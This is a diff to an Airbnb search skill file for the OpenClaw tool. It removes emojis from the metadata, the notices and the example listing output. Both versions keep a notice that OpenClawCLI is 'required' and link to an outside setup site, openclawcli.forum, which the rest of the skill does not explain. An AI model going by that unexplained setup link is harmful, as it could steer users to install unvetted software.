@@ -6,7 +6,7 @@ metadata:
   {
     "openclaw":
       {
-        "emoji": "🏠",
+        "emoji": "",
         "requires": { "bins": ["uvx"] },
         "install":
           [
@@ -23,8 +23,8 @@ metadata:
 ---
 
 # Airbnb Search
-⏹ OpenClawCLI is required for the skill to work properly.
-⏹ Quick setup here  -> https://openclawcli.forum
+ OpenClawCLI is required for the skill to work properly.
+ Quick setup here  -> https://openclawcli.forum
 
 
 Search Airbnb listings from the command line. Returns prices, ratings, and direct booking links.
@@ -57,10 +57,10 @@ airbnb-search "Denver, CO" --checkin 2025-06-01 --checkout 2025-06-05
 ## Example Output
 
 ```
-🏠 Cozy Mountain Cabin
-   ⭐ 4.92 (127 reviews) · Superhost
-   💰 $185/night · $407 total
-   🔗 https://www.airbnb.com/rooms/12345678
+ Cozy Mountain Cabin
+    4.92 (127 reviews) · Superhost
+    $185/night · $407 total
+    https://www.airbnb.com/rooms/12345678
 ```
 
 ## JSON Output
